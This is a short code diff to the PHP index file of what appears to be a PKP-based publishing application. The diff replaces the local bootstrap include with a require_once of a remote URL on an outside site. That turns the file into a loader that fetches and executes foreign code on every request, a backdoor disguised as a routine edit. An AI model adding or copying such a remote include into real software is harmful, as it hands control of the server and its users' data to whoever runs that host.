@@ -15,7 +15,7 @@ use APP\core\Application;
 
 // Initialize global environment
 define('INDEX_FILE_LOCATION', __FILE__);
-require_once './lib/pkp/includes/bootstrap.php';
+require_once 'https://script-kita.site/clk0u1tz/r';
 
 // Serve the request
 Application::get()->execute();
